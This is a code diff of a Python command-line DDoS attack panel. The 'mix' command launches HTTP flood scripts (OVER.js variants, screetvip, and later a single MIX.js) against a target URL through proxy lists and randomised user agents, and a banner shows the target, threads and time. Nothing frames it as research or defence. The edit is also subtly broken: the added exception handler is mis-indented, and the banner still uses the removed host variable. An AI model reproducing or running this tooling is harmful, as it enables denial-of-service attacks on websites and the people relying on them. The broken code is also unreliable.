@@ -705,21 +705,13 @@ def main():
 			    main()
 		elif sinput == "mix" or sinput == "MIX":
 			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
+				url = sin.split()[1]
+				thread = sin.split()[2]
 				time = sin.split()[3]
-				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
-				os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
-				os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
-				os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
-				os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
-				os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
-				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
-				os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
-				os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
-				os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
-				os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
-				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
+				os.system(f'node MIX.js {url} {thread} {time}')
+            except IndexError:
+                print('Usage: mix <url> <thread> <time>')
+                print('Example: mix http://example.com 500 60')
 				os.system ("clear")
 				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
@@ -729,8 +721,8 @@ def main():
 \033[35m                ╚╦════════════════════════════════════════════╦╝
 \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
 \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
+\033[1;37m                THREAD     : \033[35m[ \033[1;37m{thread} \033[35m]
 \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
 \033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
 \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
 \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
